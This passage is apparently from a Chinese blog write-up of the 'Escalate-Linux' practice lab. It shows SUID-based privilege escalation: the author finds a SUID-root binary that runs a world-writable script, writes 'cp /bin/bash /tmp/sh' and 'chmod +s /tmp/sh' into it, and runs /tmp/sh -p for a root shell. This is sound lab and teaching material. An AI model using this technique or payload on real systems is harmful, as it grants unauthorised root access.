+</code></pre><p>从 <code>/</code> 根目录开始，全盘查找 <strong>带有 SUID 权限的普通文件</strong>，并隐藏没有权限访问时产生的错误信息。</p><p><img src=/usually-blog/posts/escalate-linux/image-20260703004424356.png alt=image-20260703004424356></p><p>这里看到一个直接叫shell的文件，到该目录查看一下文件权限</p><p><img src=/usually-blog/posts/escalate-linux/image-20260703005528887.png alt=image-20260703005528887></p><p>这里意外惊喜看到一个script.sh的文件，这个权限是所有人都是root权限</p><h2 id=suid提权>suid提权<a hidden class=anchor aria-hidden=true href=#suid提权>#</a></h2><p>通过写入我们找到的这个.script.sh文件提权脚本进去，suid执行就能直接提权成功</p><p><img src=/usually-blog/posts/escalate-linux/image-20260703012751451.png alt=image-20260703012751451></p><p>恶意脚本</p><pre tabindex=0><code>cp /bin/bash /tmp/sh
+chmod +s /tmp/sh 
+</code></pre><p>现在确实成功写进去了这个脚本，但是我们自己执行是没有什么用处的，需要root权限的用户执行的才能让我们通过suid提权成功，这里需要往回走一点，我们之前看到的shell这个脚本，</p><pre tabindex=0><code>strings shell 
+
+/lib64/ld-linux-x86-64.so.2
+{X&lt;vuo&#39;S
+libc.so.6
+setuid
+system
+__cxa_finalize
+setgid
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+=y       
+=W       
+=Z       
+AWAVI
+AUATL
+[]A\A]A^A_
+./.script.sh
+;*3$&#34;
+GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7696
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+shell.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+</code></pre><p>提权思路这里</p><pre tabindex=0><code>shell 是 SUID root 程序
+↓
+你执行 ./shell
+↓
+./shell 以 root 有效权限运行
+↓
+./shell 内部调用 ./.script.sh
+↓
+.script.sh 又是全局可写的
+↓
+你把恶意命令写进 .script.sh
+↓
+这些命令被 root 身份执行
+↓
+生成 /tmp/sh 这个 SUID root bash
+↓
+执行 /tmp/sh -p 获得 root shell
+</code></pre><p><img src=/usually-blog/posts/escalate-linux/image-20260703013956544.png alt=image-20260703013956544></p><p>这个是通过suid提权的算是，这里面的smba ，nfs等相关服务还没去看，应该是有其他链路进攻的</p></div><footer class=post-footer><ul class=post-tags></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Escalate-Linux渗透 on x" href="https://x.com/intent/tweet/?text=Escalate-Linux%e6%b8%97%e9%80%8f&amp;url=https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Escalate-Linux渗透 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f&amp;title=Escalate-Linux%e6%b8%97%e9%80%8f&amp;summary=Escalate-Linux%e6%b8%97%e9%80%8f&amp;source=https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Escalate-Linux渗透 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f&title=Escalate-Linux%e6%b8%97%e9%80%8f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Escalate-Linux渗透 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Escalate-Linux渗透 on whatsapp" href="https://api.whatsapp.com/send?text=Escalate-Linux%e6%b8%97%e9%80%8f%20-%20https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Escalate-Linux渗透 on telegram" href="https://telegram.me/share/url?text=Escalate-Linux%e6%b8%97%e9%80%8f&amp;url=https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Escalate-Linux渗透 on ycombinator" href="https://news.ycombinator.com/submitlink?t=Escalate-Linux%e6%b8%97%e9%80%8f&u=https%3a%2f%2fusually885.github.io%2fusually-blog%2fposts%2fescalate-linux%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer><section class=comments><h2>Comments</h2><div id=giscus-container></div><script>(()=>{const t=document.getElementById("giscus-container");if(!t||t.childElementCount>0)return;const n=()=>document.documentElement.dataset.theme==="dark"?"dark":"light",e=document.createElement("script");e.src="https://giscus.app/client.js",e.async=!0,e.crossOrigin="anonymous",e.setAttribute("data-repo","usually885/usually-blog"),e.setAttribute("data-repo-id","R_kgDOSljAYg"),e.setAttribute("data-category","Announcements"),e.setAttribute("data-category-id","DIC_kwDOSljAYs4C90Da"),e.setAttribute("data-mapping","pathname"),e.setAttribute("data-strict","0"),e.setAttribute("data-reactions-enabled","1"),e.setAttribute("data-emit-metadata","0"),e.setAttribute("data-input-position","bottom"),e.setAttribute("data-lang","zh-CN"),e.setAttribute("data-theme",n()),t.appendChild(e);const s=()=>{const e=document.querySelector("iframe.giscus-frame");if(!e)return;e.contentWindow.postMessage({giscus:{setConfig:{theme:n()}}},"https://giscus.app")},o=new MutationObserver(s);o.observe(document.documentElement,{attributes:!0,attributeFilter:["data-theme"]}),window.addEventListener("load",s,{once:!0})})()</script></section></article></main><footer class=footer><span>&copy; 2026 <a href=https://usually885.github.io/usually-blog/>usually885</a></span> ·
+<span>Powered by
+<a href="https://gohugo.io/?utm_source=papermod" rel=noopener target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top id=top-link class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey=g><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up"><polyline points="17 11 12 6 7 11"/><polyline points="17 18 12 13 7 18"/></svg>
+</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var toplink=document.getElementById("top-link");window.onscroll=function(){const e=window.innerHeight;document.body.scrollTop>e||document.documentElement.scrollTop>e?toplink.classList.remove("hidden"):toplink.classList.add("hidden")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
